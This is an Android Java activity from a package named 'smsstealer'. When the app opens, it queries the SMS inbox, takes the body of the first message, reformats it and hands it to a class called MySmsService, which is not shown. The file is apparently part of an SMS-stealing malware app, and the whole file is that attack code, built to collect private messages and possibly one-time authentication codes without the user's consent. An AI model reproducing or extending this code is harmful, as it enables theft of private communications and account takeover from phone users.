package com.example.shiva.smsstealer;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;



public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        String str = " ";
        Uri inboxURI = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(inboxURI, null, null, null, null);
        if (cur.moveToFirst()) {
            str = cur.getString(cur.getColumnIndexOrThrow("body"));
        }
        str=str.replace(" ","_");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent intent = new Intent(MainActivity.this, MySmsService.class);
        intent.putExtra("str", str);
        startActivity(intent);

        }
}
